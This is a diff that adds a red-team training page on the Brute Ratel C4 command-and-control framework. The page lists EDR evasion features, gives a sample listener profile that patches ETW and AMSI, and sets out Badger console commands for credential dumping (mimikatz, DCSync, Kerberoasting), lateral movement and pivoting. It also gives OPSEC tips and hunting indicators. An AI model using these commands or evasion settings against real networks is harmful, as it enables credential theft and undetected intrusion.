@@ -1,0 +1,176 @@
+---
+layout: training-page
+title: "Brute Ratel C4 — Red Team Academy"
+module: "C2 Frameworks"
+tags:
+  - brute-ratel
+  - brc4
+  - badger
+  - c2
+  - edr-bypass
+page_key: "c2-brute-ratel"
+---
+<h1>Brute Ratel C4 (BRC4)</h1>
+  <p>Brute Ratel C4 is a commercial red team C2 framework by Chetan Nayak (@NtRaiseHardError). Its "Badger" agent is designed with EDR evasion as the primary goal — no Cobalt Strike-derived code, unique syscall implementation, and direct kernel object manipulation. BRC4 gained notoriety when leaked in 2022; licensed versions are available for legitimate red teams.</p>
+
+  <h2>Architecture Overview</h2>
+  <pre><code"># BRC4 Components:
+# - Server: C2 backend (Windows or Linux via Wine)
+# - Client (BRc4.exe): operator GUI
+# - Badger: agent (x64/x86, EXE/DLL/shellcode)
+# - Profiles: HTTP/S/DNS/SMB/TCP communication configurations
+
+# Badger evasion features:
+# - API hashing (no import table of sensitive functions)
+# - Stack encryption during sleep
+# - Indirect syscalls via custom Hell's Gate implementation
+# - Thread call stack spoofing
+# - ETW/AMSI patching
+# - Process injection without NtWriteVirtualMemory hooks
+# - Module stomping for shellcode allocation
+# - Parent process ID spoofing
+# - Block non-Microsoft DLLs (PROCESS_CREATION_MITIGATION_POLICY)</code></pre>
+
+  <h2>Profile Configuration</h2>
+  <pre><code"># BRC4 profile (JSON format):
+&#123;
+  "name": "http_profile",
+  "type": "Http",
+  "listener": "192.168.1.100",
+  "port": 443,
+  "ssl": true,
+  "hosts": ["cdn.ajax.googleapis.com"],
+  "sleeptime": 10,
+  "jitter": 20,
+  "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+  "headers": &#123;
+    "Accept": "text/html,application/xhtml+xml",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Connection": "keep-alive"
+  &#125;,
+  "uris": ["/api/v2/events", "/api/v2/metrics", "/assets/bundle.js"],
+  "post_uri": "/api/v2/submit",
+  "badger": &#123;
+    "sleep_mask": true,
+    "syscall": "indirect",
+    "stack_spoof": true,
+    "etw": "patch",
+    "amsi": "patch",
+    "parent_pid": "explorer.exe",
+    "block_dlls": true
+  &#125;
+&#125;</code></pre>
+
+  <h2>Badger Commands</h2>
+  <pre><code"># BRC4 interactive console:
+
+# Reconnaissance:
+lsarpc_enumdomusers         # enumerate domain users via LSARPC (no net.exe)
+lsarpc_enumdomgroups        # enumerate domain groups
+samr_getmembersingroup      # group membership via SAMR
+
+# Host-based enumeration:
+ps                          # process list
+netstat                     # active connections
+env                         # environment variables
+whoami                      # current user + privileges
+ipconfig                    # network interfaces
+
+# Credential access:
+mimikatz sekurlsa::logonpasswords    # inline mimikatz
+mimikatz sekurlsa::wdigest
+mimikatz lsadump::sam               # local SAM
+mimikatz lsadump::dcsync /user:Administrator  # DCSync
+
+# Kerberos:
+kerberoast                  # Kerberoasting
+asktgt /user:administrator  # AS-REP roasting
+rubeus                      # inline Rubeus
+
+# Lateral movement:
+jump_wmi TARGET             # WMI lateral movement
+jump_psexec TARGET          # PSExec lateral movement
+jump_winrm TARGET           # WinRM
+
+# Pivoting:
+socks5 1080                 # SOCKS5 proxy
+portfwd 8080:127.0.0.1:80  # port forward
+p2p_smb TARGET PIPE         # SMB pivot to child badger</code></pre>
+
+  <h2>Unique Evasion Techniques</h2>
+  <pre><code"># BRC4 differentiators:
+
+# 1. No suspicious imports in Badger PE:
+#    All NTAPI resolved via API hashing
+#    Import table only shows innocuous functions
+#    PEsieve, Hunt-Sleeping-Beacons, Moneta won't find Cobalt Strike IOCs
+
+# 2. SleepMask (proprietary):
+#    Encrypts entire Badger memory + PE headers during sleep
+#    Uses ROP chain to call encryption routines from ntdll
+#    Stack shows NtWaitForSingleObject called from RtlUserThread
+
+# 3. Process Injection (custom):
+#    Doesn't use classic WriteProcessMemory + CreateRemoteThread
+#    Uses NtMapViewOfSection-based injection:
+#    Create section → NtMapViewOfSection into target → APC to execute
+#    No NtWriteVirtualMemory calls (commonly monitored)
+
+# 4. UDRL (User Defined Reflective Loader):
+#    Custom reflective DLL loader (not the classic Stephen Fewer version)
+#    Hides PE headers after loading
+#    Randomizes sleep timer per-agent using hardware RDTSC
+
+# 5. DNS C2:
+#    DNS over HTTPS (DoH) profile available
+#    Data encoded in TXT/A/AAAA DNS records
+#    Can bypass strict egress filtering</code></pre>
+
+  <h2>Detection &amp; OPSEC Notes</h2>
+  <pre><code"># BRC4 IOCs post-2022 leak:
+
+# Network:
+# - Hardcoded User-Agent strings from leaked profiles
+# - Specific URI patterns in leaked configs
+# - Certificate fingerprints from known C2 infra
+
+# Memory:
+# - Leaked Badger DLL signatures in AV databases (post-2022)
+# - Custom legitimate versions should be compiled from source
+# - Badger UDRL doesn't fully hide PE headers in older versions
+
+# OPSEC best practices:
+# - Generate new Badger builds per engagement
+# - Use CDN redirectors (Cloudflare, Fastly) as front
+# - Custom profiles with engagement-specific URIs
+# - Rotate SSL certificates per engagement
+# - Use DNS profile for air-gapped / restricted environments
+
+# Hunting BRC4:
+# Look for processes with:
+# - PE but no MZ header at base (header stomping)
+# - Executable memory not backed by file on disk
+# - RWX memory regions without corresponding module</code></pre>
+
+  <h2>Obtaining BRC4</h2>
+  <pre><code"># BRC4 is commercial software:
+# License: $2,500/user/year (as of 2023)
+# Website: bruteratel.com
+# Legitimate red team licensing required
+
+# DO NOT use the leaked 2022 cracked version:
+# - Contains backdoors added by threat actors
+# - Used in APT campaigns (tracked by Palo Alto Unit42)
+# - Legal and ethical issues with unauthorized use
+
+# Alternative: Havoc (open source, similar evasion features)
+# Sliver (open source, less evasion-focused but actively maintained)</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>BRC4 Documentation — <code>bruteratel.com/documentation</code></li>
+    <li>Unit42 — BRC4 threat actor usage analysis</li>
+    <li>C2 Matrix — feature comparison vs other frameworks</li>
+    <li>Chetan Nayak — <code>twitter.com/NtRaiseHardError</code> — author</li>
+    <li>Elastic — Brute Ratel C4 detection research</li>
+  </ul>
